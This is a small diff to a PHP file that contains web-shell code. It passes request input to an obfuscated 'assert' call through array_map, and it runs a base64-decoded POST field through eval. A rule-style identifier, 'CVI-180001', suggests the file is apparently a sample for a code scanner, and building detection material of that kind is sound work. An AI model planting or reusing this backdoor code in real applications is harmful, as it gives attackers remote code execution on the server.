@@ -11,7 +11,7 @@ $cmd = $_REQUEST['a'];
 print($callback);
 
 # CVI-180001
-@array_map("ass\x65rt",(array)@$cmd);
+@array_map("ass\x65rt",@$cmd);
 
 $param = base64_decode($_POST['test']);
 eval($param);
